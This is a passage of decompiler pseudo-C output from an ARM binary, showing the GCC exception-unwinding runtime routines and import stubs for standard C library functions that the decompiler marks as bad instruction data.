    if (param_4 == 1) {
      uVar1 = 0x10;
    }
    else {
      uVar1 = 0x20;
    }
    if (uVar1 < uVar4) {
      return 2;
    }
    bVar10 = param_4 == 1;
    if (uVar7 >= 0x10 && bVar10) {
      return 2;
    }
    uVar1 = param_3;
    if ((uVar7 < 0x10) && (uVar1 = 0, 0x10 < uVar4)) {
      uVar1 = uVar4 - 0x10;
    }
    bVar9 = uVar1 != 0;
    if (bVar9 && param_4 != 5) {
      return 2;
    }
    if ((uVar7 < 0x10) && (uVar4 = *param_1, (uVar4 & 1) != 0)) {
      *param_1 = uVar4 & 0xfffffffe;
      if (param_4 == 5) {
        *param_1 = uVar4 & 0xfffffffe | 2;
        __gnu_Unwind_Save_VFP_D();
      }
      else {
        *param_1 = uVar4 & 0xfffffffc;
        __gnu_Unwind_Save_VFP(param_1 + 0x12);
      }
    }
    if ((bVar9) && ((*param_1 & 4) != 0)) {
      *param_1 = *param_1 & 0xfffffffb;
      __gnu_Unwind_Save_VFP_D_16_to_31(param_1 + 0x34);
    }
    if (bVar10) {
      __gnu_Unwind_Save_VFP(auStack_a8);
      if (!bVar9) goto LAB_00013d8c;
    }
    else {
      if (uVar7 < 0x10) {
        __gnu_Unwind_Save_VFP_D(auStack_a8);
      }
      if (!bVar9) goto LAB_00013d8c;
      __gnu_Unwind_Save_VFP_D_16_to_31(auStack_1a8);
    }
    param_3 = 0x10 - uVar7;
LAB_00013d8c:
    puVar5 = (undefined4 *)param_1[0xe];
    if (0 < (int)param_3) {
      iVar8 = param_3 * 2;
      puVar2 = auStack_a8 + uVar7 * 2;
      puVar6 = puVar5;
      while (bVar11 = iVar8 != 0, iVar8 = iVar8 + -1, bVar11) {
        *puVar2 = *puVar6;
        puVar2 = puVar2 + 1;
        puVar6 = puVar6 + 1;
      }
      puVar5 = puVar5 + param_3 * 2;
    }
    if (bVar9) {
      uVar4 = uVar7;
      if (uVar7 < 0x10) {
        uVar4 = 0x10;
      }
      iVar8 = uVar1 * 2;
      puVar2 = auStack_228 + uVar4 * 2;
      puVar6 = puVar5;
      while (bVar11 = iVar8 != 0, iVar8 = iVar8 + -1, bVar11) {
        *puVar2 = *puVar6;
        puVar2 = puVar2 + 1;
        puVar6 = puVar6 + 1;
      }
      puVar5 = puVar5 + uVar1 * 2;
    }
    if (bVar10) {
      puVar5 = puVar5 + 1;
    }
    param_1[0xe] = (uint)puVar5;
    if (bVar10) {
      __gnu_Unwind_Restore_VFP(auStack_a8);
    }
    else {
      if (uVar7 < 0x10) {
        __gnu_Unwind_Restore_VFP_D(auStack_a8);
      }
      if (!bVar9) {
        return 0;
      }
      __gnu_Unwind_Restore_VFP_D_16_to_31(auStack_1a8);
    }
    return 0;
  case 2:
    return 1;
  case 3:
    if (param_4 == 3) {
      uVar7 = param_3 & 0xffff;
      if (uVar7 + (param_3 >> 0x10) < 0x11) {
        if ((*param_1 & 8) != 0) {
          *param_1 = *param_1 & 0xfffffff7;
          __gnu_Unwind_Save_WMMXD(param_1 + 0x6c);
        }
        __gnu_Unwind_Save_WMMXD(auStack_128);
        puVar6 = (undefined4 *)param_1[0xe];
        puVar5 = puVar6;
        puVar2 = auStack_128 + (param_3 >> 0x10) * 2;
        for (iVar8 = uVar7 * 2; iVar8 != 0; iVar8 = iVar8 + -1) {
          *puVar2 = *puVar5;
          puVar5 = puVar5 + 1;
          puVar2 = puVar2 + 1;
        }
        param_1[0xe] = (uint)(puVar6 + uVar7 * 2);
        __gnu_Unwind_Restore_WMMXD(auStack_128);
        return 0;
      }
    }
    break;
  case 4:
    bVar10 = param_3 == 0x10;
    if (param_3 < 0x11) {
      bVar10 = param_4 == 0;
    }
    if (bVar10) {
      if ((*param_1 & 0x10) != 0) {
        *param_1 = *param_1 & 0xffffffef;
        __gnu_Unwind_Save_WMMXC(param_1 + 0x8c);
      }
      __gnu_Unwind_Save_WMMXC(local_1b8);
      puVar5 = (undefined4 *)param_1[0xe];
      uVar7 = 0;
      do {
        if ((param_3 & 1 << (uVar7 & 0xff)) != 0) {
          local_1b8[uVar7] = *puVar5;
          puVar5 = puVar5 + 1;
        }
        uVar7 = uVar7 + 1;
      } while (uVar7 != 4);
      param_1[0xe] = (uint)puVar5;
      __gnu_Unwind_Restore_WMMXC(local_1b8);
      return 0;
    }
  }
  return 2;
}


/* === _Unwind_GetCFA @ 00013f44 === */

undefined4 _Unwind_GetCFA(int param_1)

{
  return *(undefined4 *)(param_1 + 0x44);
}


/* === __gnu_Unwind_RaiseException @ 00013f4c === */

undefined4 __gnu_Unwind_RaiseException(int param_1,int param_2)

{
  int iVar1;
  undefined4 local_258;
  undefined4 local_254;
  undefined4 uStack_250;
  undefined4 uStack_24c;
  undefined4 uStack_248;
  undefined4 local_244;
  undefined4 uStack_240;
  undefined4 uStack_23c;
  undefined4 uStack_238;
  undefined4 local_234;
  undefined4 uStack_230;
  undefined4 uStack_22c;
  undefined4 uStack_228;
  undefined4 local_224;
  undefined4 uStack_220;
  undefined4 uStack_21c;
  undefined4 local_218;
  
  *(undefined4 *)(param_2 + 0x40) = *(undefined4 *)(param_2 + 0x3c);
  local_254 = *(undefined4 *)(param_2 + 4);
  uStack_250 = *(undefined4 *)(param_2 + 8);
  uStack_24c = *(undefined4 *)(param_2 + 0xc);
  uStack_248 = *(undefined4 *)(param_2 + 0x10);
  local_244 = *(undefined4 *)(param_2 + 0x14);
  uStack_240 = *(undefined4 *)(param_2 + 0x18);
  uStack_23c = *(undefined4 *)(param_2 + 0x1c);
  uStack_238 = *(undefined4 *)(param_2 + 0x20);
  local_234 = *(undefined4 *)(param_2 + 0x24);
  uStack_230 = *(undefined4 *)(param_2 + 0x28);
  uStack_22c = *(undefined4 *)(param_2 + 0x2c);
  uStack_228 = *(undefined4 *)(param_2 + 0x30);
  local_224 = *(undefined4 *)(param_2 + 0x34);
  uStack_220 = *(undefined4 *)(param_2 + 0x38);
  uStack_21c = *(undefined4 *)(param_2 + 0x3c);
  local_218 = *(undefined4 *)(param_2 + 0x40);
  local_258 = 0xffffffff;
  do {
    iVar1 = FUN_000133b8(param_1,local_218);
    if (iVar1 != 0) {
      return 9;
    }
    iVar1 = (**(code **)(param_1 + 0x10))(0,param_1,&local_258);
  } while (iVar1 == 8);
  FUN_0001358c(&local_258);
  if (iVar1 == 6) {
    FUN_0001370c(param_1,param_2);
  }
  return 9;
}


/* === __gnu_Unwind_ForcedUnwind @ 00013ff0 === */

void __gnu_Unwind_ForcedUnwind(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  undefined4 uVar1;
  
  *(undefined4 *)(param_1 + 0x18) = param_3;
  uVar1 = *(undefined4 *)(param_4 + 0x3c);
  *(undefined4 *)(param_1 + 0xc) = param_2;
  *(undefined4 *)(param_4 + 0x40) = uVar1;
  FUN_000135f8(param_1,param_4,0);
  return;
}


/* === __gnu_Unwind_Resume @ 0001400c === */

void __gnu_Unwind_Resume(int param_1,int param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  
  *(undefined4 *)(param_2 + 0x40) = *(undefined4 *)(param_1 + 0x14);
  if (*(int *)(param_1 + 0xc) == 0) {
    iVar1 = (**(code **)(param_1 + 0x10))(2,param_1,param_2,*(code **)(param_1 + 0x10),param_4);
    if (iVar1 == 7) {
      restore_core_regs(param_2 + 4);
    }
    else if (iVar1 != 8) goto LAB_00014074;
    FUN_0001370c(param_1,param_2);
  }
  else {
    FUN_000135f8(param_1,param_2,1);
  }
LAB_00014074:
                    /* WARNING: Subroutine does not return */
  abort();
}


/* === __gnu_Unwind_Resume_or_Rethrow @ 00014078 === */

void __gnu_Unwind_Resume_or_Rethrow(int param_1,int param_2)

{
  if (*(int *)(param_1 + 0xc) == 0) {
    __gnu_Unwind_RaiseException();
    return;
  }
  *(undefined4 *)(param_2 + 0x40) = *(undefined4 *)(param_2 + 0x3c);
  FUN_000135f8(param_1,param_2,0);
  return;
}


/* === _Unwind_Complete @ 00014098 === */

void _Unwind_Complete(void)

{
  return;
}


/* === _Unwind_DeleteException @ 0001409c === */

void _Unwind_DeleteException(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  code *pcVar1;
  
  pcVar1 = *(code **)(param_1 + 8);
  if (pcVar1 == (code *)0x0) {
    return;
  }
  (*pcVar1)(1,param_1,param_3,pcVar1,param_4);
  return;
}


/* === __gnu_Unwind_Backtrace @ 000140bc === */

int __gnu_Unwind_Backtrace(code *param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  undefined1 auStack_2a8 [16];
  code *local_298;
  undefined4 local_250;
  undefined4 local_24c;
  undefined4 uStack_248;
  undefined4 uStack_244;
  undefined4 uStack_240;
  undefined4 local_23c;
  undefined4 uStack_238;
  undefined4 uStack_234;
  undefined4 uStack_230;
  undefined4 local_22c;
  undefined4 uStack_228;
  undefined4 uStack_224;
  undefined4 uStack_220;
  undefined4 local_21c;
  undefined4 uStack_218;
  undefined4 uStack_214;
  undefined4 local_210;
  
  *(undefined4 *)(param_3 + 0x40) = *(undefined4 *)(param_3 + 0x3c);
  local_24c = *(undefined4 *)(param_3 + 4);
  uStack_248 = *(undefined4 *)(param_3 + 8);
  uStack_244 = *(undefined4 *)(param_3 + 0xc);
  uStack_240 = *(undefined4 *)(param_3 + 0x10);
  local_23c = *(undefined4 *)(param_3 + 0x14);
  uStack_238 = *(undefined4 *)(param_3 + 0x18);
  uStack_234 = *(undefined4 *)(param_3 + 0x1c);
  uStack_230 = *(undefined4 *)(param_3 + 0x20);
  local_22c = *(undefined4 *)(param_3 + 0x24);
  uStack_228 = *(undefined4 *)(param_3 + 0x28);
  uStack_224 = *(undefined4 *)(param_3 + 0x2c);
  uStack_220 = *(undefined4 *)(param_3 + 0x30);
  local_21c = *(undefined4 *)(param_3 + 0x34);
  uStack_218 = *(undefined4 *)(param_3 + 0x38);
  uStack_214 = *(undefined4 *)(param_3 + 0x3c);
  local_210 = *(undefined4 *)(param_3 + 0x40);
  local_250 = 0xffffffff;
  do {
    iVar1 = FUN_000133b8(auStack_2a8,local_210);
    if (iVar1 != 0) {
LAB_00014164:
      iVar1 = 9;
      break;
    }
    FUN_00013814(&local_250,0xc,auStack_2a8);
    iVar1 = (*param_1)(&local_250,param_2);
    if (iVar1 != 0) goto LAB_00014164;
    iVar1 = (*local_298)(8,auStack_2a8,&local_250);
  } while (iVar1 != 9 && iVar1 != 5);
  FUN_0001358c(&local_250);
  return iVar1;
}


/* === restore_core_regs @ 0001417c === */

undefined8 restore_core_regs(undefined8 *param_1)

{
  return *param_1;
}


/* === __gnu_Unwind_Restore_VFP @ 00014190 === */

undefined4 __gnu_Unwind_Restore_VFP(undefined8 *param_1)

{
  return (int)*param_1;
}


/* === __gnu_Unwind_Save_VFP @ 00014198 === */

void __gnu_Unwind_Save_VFP(undefined8 *param_1)

{
  undefined8 in_d0;
  undefined8 in_d1;
  undefined8 in_d2;
  undefined8 in_d3;
  undefined8 in_d4;
  undefined8 in_d5;
  undefined8 in_d6;
  undefined8 in_d7;
  undefined8 unaff_d8;
  undefined8 unaff_d9;
  undefined8 unaff_d10;
  undefined8 unaff_d11;
  undefined8 unaff_d12;
  undefined8 unaff_d13;
  undefined8 unaff_d14;
  undefined8 unaff_d15;
  
  *param_1 = in_d0;
  param_1[1] = in_d1;
  param_1[2] = in_d2;
  param_1[3] = in_d3;
  param_1[4] = in_d4;
  param_1[5] = in_d5;
  param_1[6] = in_d6;
  param_1[7] = in_d7;
  param_1[8] = unaff_d8;
  param_1[9] = unaff_d9;
  param_1[10] = unaff_d10;
  param_1[0xb] = unaff_d11;
  param_1[0xc] = unaff_d12;
  param_1[0xd] = unaff_d13;
  param_1[0xe] = unaff_d14;
  param_1[0xf] = unaff_d15;
  return;
}


/* === __gnu_Unwind_Restore_VFP_D @ 000141a0 === */

undefined4 __gnu_Unwind_Restore_VFP_D(undefined8 *param_1)

{
  return (int)*param_1;
}


/* === __gnu_Unwind_Save_VFP_D @ 000141a8 === */

void __gnu_Unwind_Save_VFP_D(undefined8 *param_1)

{
  undefined8 in_d0;
  undefined8 in_d1;
  undefined8 in_d2;
  undefined8 in_d3;
  undefined8 in_d4;
  undefined8 in_d5;
  undefined8 in_d6;
  undefined8 in_d7;
  undefined8 unaff_d8;
  undefined8 unaff_d9;
  undefined8 unaff_d10;
  undefined8 unaff_d11;
  undefined8 unaff_d12;
  undefined8 unaff_d13;
  undefined8 unaff_d14;
  undefined8 unaff_d15;
  
  *param_1 = in_d0;
  param_1[1] = in_d1;
  param_1[2] = in_d2;
  param_1[3] = in_d3;
  param_1[4] = in_d4;
  param_1[5] = in_d5;
  param_1[6] = in_d6;
  param_1[7] = in_d7;
  param_1[8] = unaff_d8;
  param_1[9] = unaff_d9;
  param_1[10] = unaff_d10;
  param_1[0xb] = unaff_d11;
  param_1[0xc] = unaff_d12;
  param_1[0xd] = unaff_d13;
  param_1[0xe] = unaff_d14;
  param_1[0xf] = unaff_d15;
  return;
}


/* === __gnu_Unwind_Restore_VFP_D_16_to_31 @ 000141b0 === */

void __gnu_Unwind_Restore_VFP_D_16_to_31(void)

{
  return;
}


/* === __gnu_Unwind_Save_VFP_D_16_to_31 @ 000141b8 === */

void __gnu_Unwind_Save_VFP_D_16_to_31(undefined8 *param_1)

{
  undefined8 in_d16;
  undefined8 in_d17;
  undefined8 in_d18;
  undefined8 in_d19;
  undefined8 in_d20;
  undefined8 in_d21;
  undefined8 in_d22;
  undefined8 in_d23;
  undefined8 in_d24;
  undefined8 in_d25;
  undefined8 in_d26;
  undefined8 in_d27;
  undefined8 in_d28;
  undefined8 in_d29;
  undefined8 in_d30;
  undefined8 in_d31;
  
  *param_1 = in_d16;
  param_1[1] = in_d17;
  param_1[2] = in_d18;
  param_1[3] = in_d19;
  param_1[4] = in_d20;
  param_1[5] = in_d21;
  param_1[6] = in_d22;
  param_1[7] = in_d23;
  param_1[8] = in_d24;
  param_1[9] = in_d25;
  param_1[10] = in_d26;
  param_1[0xb] = in_d27;
  param_1[0xc] = in_d28;
  param_1[0xd] = in_d29;
  param_1[0xe] = in_d30;
  param_1[0xf] = in_d31;
  return;
}


/* === __gnu_Unwind_Restore_WMMXD @ 000141c0 === */

int __gnu_Unwind_Restore_WMMXD(int param_1)

{
  undefined4 in_cr0;
  undefined4 in_cr1;
  undefined4 in_cr2;
  undefined4 in_cr3;
  undefined4 in_cr4;
  undefined4 in_cr5;
  undefined4 in_cr6;
  undefined4 in_cr7;
  undefined4 in_cr8;
  undefined4 in_cr9;
  undefined4 in_cr10;
  undefined4 in_cr11;
  undefined4 in_cr12;
  undefined4 in_cr13;
  undefined4 in_cr14;
  undefined4 in_cr15;
  
  coprocessor_loadlong(1,in_cr0,param_1);
  coprocessor_loadlong(1,in_cr1,param_1 + 8);
  coprocessor_loadlong(1,in_cr2,param_1 + 0x10);
  coprocessor_loadlong(1,in_cr3,param_1 + 0x18);
  coprocessor_loadlong(1,in_cr4,param_1 + 0x20);
  coprocessor_loadlong(1,in_cr5,param_1 + 0x28);
  coprocessor_loadlong(1,in_cr6,param_1 + 0x30);
  coprocessor_loadlong(1,in_cr7,param_1 + 0x38);
  coprocessor_loadlong(1,in_cr8,param_1 + 0x40);
  coprocessor_loadlong(1,in_cr9,param_1 + 0x48);
  coprocessor_loadlong(1,in_cr10,param_1 + 0x50);
  coprocessor_loadlong(1,in_cr11,param_1 + 0x58);
  coprocessor_loadlong(1,in_cr12,param_1 + 0x60);
  coprocessor_loadlong(1,in_cr13,param_1 + 0x68);
  coprocessor_loadlong(1,in_cr14,param_1 + 0x70);
  coprocessor_loadlong(1,in_cr15,param_1 + 0x78);
  return param_1 + 0x80;
}


/* === __gnu_Unwind_Save_WMMXD @ 00014204 === */

int __gnu_Unwind_Save_WMMXD(int param_1)

{
  undefined4 in_cr0;
  undefined4 in_cr1;
  undefined4 in_cr2;
  undefined4 in_cr3;
  undefined4 in_cr4;
  undefined4 in_cr5;
  undefined4 in_cr6;
  undefined4 in_cr7;
  undefined4 in_cr8;
  undefined4 in_cr9;
  undefined4 in_cr10;
  undefined4 in_cr11;
  undefined4 in_cr12;
  undefined4 in_cr13;
  undefined4 in_cr14;
  undefined4 in_cr15;
  
  coprocessor_storelong(1,in_cr0,param_1);
  coprocessor_storelong(1,in_cr1,param_1 + 8);
  coprocessor_storelong(1,in_cr2,param_1 + 0x10);
  coprocessor_storelong(1,in_cr3,param_1 + 0x18);
  coprocessor_storelong(1,in_cr4,param_1 + 0x20);
  coprocessor_storelong(1,in_cr5,param_1 + 0x28);
  coprocessor_storelong(1,in_cr6,param_1 + 0x30);
  coprocessor_storelong(1,in_cr7,param_1 + 0x38);
  coprocessor_storelong(1,in_cr8,param_1 + 0x40);
  coprocessor_storelong(1,in_cr9,param_1 + 0x48);
  coprocessor_storelong(1,in_cr10,param_1 + 0x50);
  coprocessor_storelong(1,in_cr11,param_1 + 0x58);
  coprocessor_storelong(1,in_cr12,param_1 + 0x60);
  coprocessor_storelong(1,in_cr13,param_1 + 0x68);
  coprocessor_storelong(1,in_cr14,param_1 + 0x70);
  coprocessor_storelong(1,in_cr15,param_1 + 0x78);
  return param_1 + 0x80;
}


/* === __gnu_Unwind_Restore_WMMXC @ 00014248 === */

int __gnu_Unwind_Restore_WMMXC(int param_1)

{
  undefined4 in_cr8;
  undefined4 in_cr9;
  undefined4 in_cr10;
  undefined4 in_cr11;
  
  coprocessor_load2(1,in_cr8,param_1);
  coprocessor_load2(1,in_cr9,param_1 + 4);
  coprocessor_load2(1,in_cr10,param_1 + 8);
  coprocessor_load2(1,in_cr11,param_1 + 0xc);
  return param_1 + 0x10;
}


/* === __gnu_Unwind_Save_WMMXC @ 0001425c === */

int __gnu_Unwind_Save_WMMXC(int param_1)

{
  undefined4 in_cr8;
  undefined4 in_cr9;
  undefined4 in_cr10;
  undefined4 in_cr11;
  
  coprocessor_store2(1,in_cr8,param_1);
  coprocessor_store2(1,in_cr9,param_1 + 4);
  coprocessor_store2(1,in_cr10,param_1 + 8);
  coprocessor_store2(1,in_cr11,param_1 + 0xc);
  return param_1 + 0x10;
}


/* === _Unwind_RaiseException @ 00014270 === */

void _Unwind_RaiseException
               (undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 uStack_34;
  
  uStack_44 = 0;
  uStack_40 = param_1;
  uStack_3c = param_2;
  uStack_38 = param_3;
  uStack_34 = param_4;
  __gnu_Unwind_RaiseException(param_1,&uStack_44,param_3,0,param_3);
  return;
}


/* === _Unwind_Resume @ 00014294 === */

void _Unwind_Resume(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 uStack_34;
  
  uStack_44 = 0;
  uStack_40 = param_1;
  uStack_3c = param_2;
  uStack_38 = param_3;
  uStack_34 = param_4;
  __gnu_Unwind_Resume(param_1,&uStack_44,param_3,0,param_3);
  return;
}


/* === _Unwind_Resume_or_Rethrow @ 000142b8 === */

void _Unwind_Resume_or_Rethrow
               (undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 uStack_34;
  
  uStack_44 = 0;
  uStack_40 = param_1;
  uStack_3c = param_2;
  uStack_38 = param_3;
  uStack_34 = param_4;
  __gnu_Unwind_Resume_or_Rethrow(param_1,&uStack_44,param_3,0,param_3);
  return;
}


/* === _Unwind_ForcedUnwind @ 000142dc === */

void _Unwind_ForcedUnwind(void)

{
  __gnu_Unwind_ForcedUnwind();
  return;
}


/* === _Unwind_Backtrace @ 00014300 === */

void _Unwind_Backtrace(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 uStack_34;
  
  uStack_44 = 0;
  uStack_40 = param_1;
  uStack_3c = param_2;
  uStack_38 = param_3;
  uStack_34 = param_4;
  __gnu_Unwind_Backtrace(param_1,param_2,&uStack_44,0,param_3);
  return;
}


/* === FUN_00014324 @ 00014324 === */

uint FUN_00014324(uint *param_1)

{
  char cVar1;
  uint uVar2;
  
  if ((char)param_1[2] == '\0') {
    if (*(char *)((int)param_1 + 9) == '\0') {
      return 0xb0;
    }
    *(char *)((int)param_1 + 9) = *(char *)((int)param_1 + 9) + -1;
    *param_1 = *(uint *)param_1[1];
    param_1[1] = (uint)((uint *)param_1[1] + 1);
    cVar1 = '\x03';
  }
  else {
    cVar1 = (char)param_1[2] + -1;
  }
  *(char *)(param_1 + 2) = cVar1;
  uVar2 = *param_1;
  *param_1 = uVar2 << 8;
  return uVar2 >> 0x18;
}


/* === __gnu_unwind_execute @ 0001437c === */

undefined4 __gnu_unwind_execute(int *param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  bool bVar4;
  int iVar5;
  int *piVar6;
  undefined4 uVar7;
  int local_24;
  
  bVar4 = false;
  piVar6 = param_1;
  uVar7 = param_2;
  local_24 = param_4;
LAB_00014394:
  do {
    while( true ) {
      uVar1 = FUN_00014324(param_2);
      if (uVar1 == 0xb0) {
        if (bVar4) {
          return 0;
        }
        _Unwind_VRS_Get(param_1,0,0xe,0,&local_24,uVar7,param_3);
        _Unwind_VRS_Set(param_1,0,0xf,0,&local_24);
        return 0;
      }
      if ((uVar1 & 0x80) != 0) break;
      _Unwind_VRS_Get(param_1,0,0xd,0,&local_24,uVar7,param_3);
      iVar5 = (uVar1 & 0x3f) * 4 + 4;
      if ((uVar1 & 0x40) != 0) {
        iVar5 = -iVar5;
      }
      local_24 = local_24 + iVar5;
LAB_000144d0:
      piVar6 = &local_24;
      _Unwind_VRS_Set(param_1,0,0xd,0);
    }
    uVar3 = uVar1 & 0xf0;
    if (uVar3 == 0x80) {
      uVar3 = FUN_00014324(param_2);
      uVar3 = uVar3 | uVar1 << 8;
      if (uVar3 == 0x8000) {
        return 9;
      }
      iVar5 = _Unwind_VRS_Pop(param_1,0,(uVar3 & 0xfff) << 4,0,piVar6);
      if (iVar5 != 0) {
        return 9;
      }
      if ((uVar3 & 0x800) != 0) {
        bVar4 = true;
      }
      goto LAB_00014394;
    }
    if (uVar3 == 0x90) {
      uVar1 = uVar1 & 0xf;
      if (uVar1 == 0xd || uVar1 == 0xf) {
        return 9;
      }
      _Unwind_VRS_Get(param_1,0,uVar1,0,&local_24,uVar7,param_3);
      goto LAB_000144d0;
    }
    if (uVar3 == 0xa0) {
      uVar2 = 0;
    }
    else if (uVar3 == 0xb0) {
      if (uVar1 == 0xb1) {
        uVar1 = FUN_00014324(param_2);
        if (uVar1 == 0) {
          return 9;
        }
        if ((uVar1 & 0xf0) != 0) {
          return 9;
        }
        uVar2 = 0;
      }
      else {
        if (uVar1 == 0xb2) {
          _Unwind_VRS_Get(param_1,0,0xd,0,&local_24,uVar7,param_3);
          uVar1 = FUN_00014324(param_2);
          uVar3 = 2;
          while ((uVar1 & 0x80) != 0) {
            local_24 = local_24 + ((uVar1 & 0x7f) << (uVar3 & 0xff));
            uVar3 = uVar3 + 7;
            uVar1 = FUN_00014324(param_2);
          }
          local_24 = local_24 + 0x204 + ((uVar1 & 0x7f) << (uVar3 & 0xff));
          goto LAB_000144d0;
        }
        if (uVar1 == 0xb3) {
          FUN_00014324(param_2);
          uVar2 = 1;
        }
        else if ((uVar1 & 0xfc) == 0xb4) {
          uVar2 = 2;
        }
        else {
          uVar2 = 1;
        }
      }
    }
    else if (uVar3 == 0xc0) {
      if (uVar1 == 0xc6) {
        FUN_00014324(param_2);
        uVar2 = 3;
      }
      else if (uVar1 == 199) {
        uVar1 = FUN_00014324(param_2);
        if (uVar1 == 0) {
          return 9;
        }
        if ((uVar1 & 0xf0) != 0) {
          return 9;
        }
        uVar2 = 4;
      }
      else {
        if ((uVar1 & 0xf8) != 0xc0) {
          if (uVar1 == 200) {
            FUN_00014324(param_2);
          }
          else {
            if (uVar1 != 0xc9) {
              return 9;
            }
            FUN_00014324(param_2);
          }
          goto LAB_000146f4;
        }
        uVar2 = 3;
      }
    }
    else {
      if ((uVar1 & 0xf8) != 0xd0) {
        return 9;
      }
LAB_000146f4:
      uVar2 = 1;
    }
    iVar5 = _Unwind_VRS_Pop(param_1,uVar2);
    if (iVar5 != 0) {
      return 9;
    }
  } while( true );
}


/* === __gnu_unwind_frame @ 00014710 === */

void __gnu_unwind_frame(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  int local_14;
  int local_10;
  undefined1 local_c;
  undefined1 local_b;
  undefined2 uStack_a;
  
  iVar1 = *(int *)(param_1 + 0x4c);
  local_14 = *(int *)(iVar1 + 4) << 8;
  local_10 = iVar1 + 8;
  uStack_a = (undefined2)((uint)param_4 >> 0x10);
  _local_c = CONCAT11(*(undefined1 *)(iVar1 + 7),3);
  __gnu_unwind_execute(param_2,&local_14,3,*(undefined1 *)(iVar1 + 7),param_1);
  return;
}


/* === _Unwind_GetRegionStart @ 00014750 === */

undefined4
_Unwind_GetRegionStart(undefined4 param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  int local_c;
  
  local_c = param_4;
  _Unwind_VRS_Get(param_1,0,0xc,0,&local_c,param_2,param_3);
  return *(undefined4 *)(local_c + 0x48);
}


/* === _Unwind_GetLanguageSpecificData @ 0001477c === */

int _Unwind_GetLanguageSpecificData
              (undefined4 param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  int local_c;
  
  local_c = param_4;
  _Unwind_VRS_Get(param_1,0,0xc,0,&local_c,param_2,param_3);
  return *(int *)(local_c + 0x4c) + (uint)*(byte *)(*(int *)(local_c + 0x4c) + 7) * 4 + 8;
}


/* === _Unwind_GetDataRelBase @ 000147b4 === */

void _Unwind_GetDataRelBase(void)

{
                    /* WARNING: Subroutine does not return */
  abort();
}


/* === _Unwind_GetTextRelBase @ 000147bc === */

void _Unwind_GetTextRelBase(void)

{
                    /* WARNING: Subroutine does not return */
  abort();
}


/* === __cxa_finalize @ 00017000 === */

/* WARNING: Control flow encountered bad instruction data */

void __cxa_finalize(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === __cxa_atexit @ 00017004 === */

/* WARNING: Control flow encountered bad instruction data */

void __cxa_atexit(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === fcntl @ 00017008 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fcntl(int __fd,int __cmd,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === memset @ 0001700c === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memset(void *__s,int __c,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === read @ 00017010 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t read(int __fd,void *__buf,size_t __nbytes)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === pthread_exit @ 00017014 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void pthread_exit(void *__retval)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === __stack_chk_fail @ 00017018 === */

/* WARNING: Control flow encountered bad instruction data */

void __stack_chk_fail(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === clock_gettime @ 00017020 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int clock_gettime(clockid_t __clock_id,timespec *__tp)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === getpid @ 00017024 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__pid_t getpid(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === snprintf @ 00017028 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int snprintf(char *__s,size_t __maxlen,char *__format,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === select @ 0001702c === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int select(int __nfds,fd_set *__readfds,fd_set *__writefds,fd_set *__exceptfds,timeval *__timeout)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === __errno @ 00017030 === */

/* WARNING: Control flow encountered bad instruction data */

void __errno(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === realloc @ 00017034 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * realloc(void *__ptr,size_t __size)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === memcpy @ 00017038 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memcpy(void *__dest,void *__src,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === free @ 0001703c === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void free(void *__ptr)

